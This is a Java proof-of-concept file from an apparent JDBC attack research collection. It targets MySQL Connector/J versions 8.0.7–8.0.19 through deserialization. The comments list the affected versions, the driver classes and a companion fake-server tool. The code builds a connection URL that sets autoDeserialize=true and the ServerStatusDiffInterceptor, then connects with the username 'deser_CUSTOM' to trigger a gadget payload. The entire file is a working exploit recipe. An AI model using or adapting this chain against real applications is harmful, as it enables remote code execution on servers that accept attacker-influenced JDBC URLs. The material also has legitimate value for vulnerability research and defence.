package org.su18.jdbc.attack.mysql.serverstatus;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/4ra1n/mysql-fake-server 进行测试
 * 依赖版本 8.0.11
 * 驱动名称 com.mysql.jdbc.Driver/com.mysql.cj.jdbc.Driver
 * 属性名 queryInterceptors
 * 连接参数 autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
 * 备注 影响版本 8.0.7 - 8.0.19
 *
 * @author Jasper
 */
public class Attack8x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.cj.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://127.0.0.1:49435/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "deser_CUSTOM", "");
	}

}
